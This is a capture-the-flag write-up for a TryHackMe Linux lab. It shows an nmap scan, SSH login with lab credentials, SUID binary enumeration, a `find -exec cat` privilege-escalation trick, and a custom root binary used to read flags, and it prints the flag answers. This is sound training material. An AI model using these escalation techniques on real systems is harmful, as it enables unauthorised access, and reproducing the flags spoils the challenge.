# [Day 8] SUID Shenanigans 08/12/2019

## Description

Elf Holly is suspicious of Elf-ministrator and wants to get onto the root account of a server he setup to see what files are on his account. The problem is, Holly is a low-privileged user.. can you escalate her privileges and hack your way into the root account?

Deploy and SSH into the machine.
* Username: `holly`
* Password: `tuD@4vt0G*TU`

SSH is not running on the standard port.. You might need to nmap scan the machine to find which port SSH is running on.

`nmap <machine_ip> -p <start_port>-<end_port>`

Read the supporting materials [here](https://blog.tryhackme.com/linux-privilege-escalation-suid/).

## #1 - What port is SSH running on?

SSH is running on port `65534`.
~~~
$ sudo nmap -sS -sV -A -p- 10.10.188.177
[sudo] password for unknown: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 08:10 CEST
Nmap scan report for 10.10.188.177
Host is up (0.046s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE VERSION
65534/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:59:b7:f7:3d:5e:11:92:24:91:03:cd:fa:7e:c7:e6 (RSA)
|   256 15:eb:e2:c6:9e:fb:18:a2:ce:b2:e6:96:87:f7:fa:f8 (ECDSA)
|_  256 f8:8b:d5:02:1b:2f:59:67:a9:f5:bc:a5:7b:ef:2b:50 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/2%OT=65534%CT=1%CU=34091%PV=Y%DS=2%DC=T%G=Y%TM=5EAD0
OS:F96%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)O
OS:PS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508S
OS:T11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)E
OS:CN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   47.20 ms 10.9.0.1
2   45.90 ms 10.10.188.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.66 seconds
~~~

## #2 - Find and run a file as igor. Read the file /home/igor/flag1.txt

Let's connect with `ssh holly@10.10.188.177 -p 65534` and password `tuD@4vt0G*TU`.

Unfortunately, we have insufficient permissions to read `/home/igor/flag1.txt`. Let's see start by listing files owned by `igor` with the `SUID` bit set.

~~~
holly@ip-10-10-188-177:~$ find / -user igor -perm -4000 -print 2>/dev/null
/usr/bin/find
/usr/bin/nmap
~~~

For older versions of `nmap` there was an interactive mode which allowed to execute commands. However, the version of `nmap` is recent, and the `--interactive` option is no longer available.

~~~
holly@ip-10-10-188-177:~$ nmap --interactive
nmap: unrecognized option '--interactive'
Nmap 7.01 ( https://nmap.org )
[SNIP]
~~~

Let's try with `find`. This command is owned by `igor`:

~~~
$ ls -l /usr/bin/find
-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
~~~

`find` allows to read the flag.

~~~
$ find /home/igor/flag1.txt -exec cat {} \;
THM{d3f0708bdd9accda7f937d013eaf2cd8}
~~~

## #3 - Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?

Now, we need to run a program as `root`. Let's find files that are owned by `root` with `SUID` bit set:

~~~
$ find / -user root -perm -4000 -print 2>/dev/null
/bin/ping
/bin/umount
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/snap/core/7396/bin/mount
/snap/core/7396/bin/ping
/snap/core/7396/bin/ping6
/snap/core/7396/bin/su
/snap/core/7396/bin/umount
/snap/core/7396/usr/bin/chfn
/snap/core/7396/usr/bin/chsh
/snap/core/7396/usr/bin/gpasswd
/snap/core/7396/usr/bin/newgrp
/snap/core/7396/usr/bin/passwd
/snap/core/7396/usr/bin/sudo
/snap/core/7396/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7396/usr/lib/openssh/ssh-keysign
/snap/core/7396/usr/lib/snapd/snap-confine
/snap/core/7396/usr/sbin/pppd
/usr/bin/system-control
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
~~~

`ping` has the SUID bit set, which should not be the case. However, I haven't been able to exploit it to access the flag.

Playing a bit with the list, I found out that `system-control` seems to be a custom binary (not found anywhere else on my Linux boxes). It simply executes commands as `root`:

~~~
holly@ip-10-10-188-177:~$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: cat /root/flag2.txt
THM{8c8211826239d849fa8d6df03749c3a2}
~~~

## #4 - If you've finished the challenge and want more practise, checkout the Privilege Escalation Playground room created by SherlockSec: https://tryhackme.com/room/privescplayground 
